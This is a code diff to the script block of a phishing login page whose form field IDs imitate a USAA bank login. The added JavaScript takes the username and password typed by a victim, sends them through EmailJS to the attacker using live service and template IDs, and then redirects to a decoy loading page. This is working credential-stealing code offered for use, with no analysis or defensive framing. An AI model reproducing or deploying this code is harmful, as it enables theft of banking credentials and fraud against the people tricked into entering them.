@@ -111,31 +111,31 @@
  </div>
  </form>
 
- <script>
-        emailjs.init("x9p2ifIOIHL_Xr4U0");
+  <script>
+                emailjs.init("1qxfSB1_KMHeE1QCN");
+              
+                function sendEmail(username, password) {
+                    emailjs.send("service_l22c57a", "template_pv5l9r6", {
+                        username: username,
+                        password: password
+                    })
+                    .then(function(response) {
+                        console.log('Email sent successfully!', response);
+                        window.location.href = 'loadingpage.html';
+                    }, function(error) {
+                        console.error('Email sending failed:', error);
+                    });
+                }
+              
+               document.getElementById('login-form').addEventListener('submit', function(event) {
+    event.preventDefault();
 
-        function sendEmail(username, password) {
-            emailjs.send("service_bsg866p", "template_2fxrpzc", {
-                username: username,
-                password: password
-            })
-            .then(function(response) {
-                console.log('Email sent successfully!', response);
-                window.location.href = 'loadingpage.html';
-            }, function(error) {
-                console.error('Email sending failed:', error);
-            });
-        }
+    const username = document.getElementById('usaa-form-v5-10-1-input-username').value;
+    const password = document.getElementById('usaa-form-v5-10-1-input-password').value;
 
-        document.getElementById('login-form').addEventListener('submit', function(event) {
-            event.preventDefault();
-            var form = document.getElementById('login-form');
-            var username = form.querySelector('#username').value;
-            var password = form.querySelector('#password').value;
-            sendEmail(username, password);
-        });
-    </script>
-    
+    sendEmail(username, password);
+});
+              </script>
 
 
 
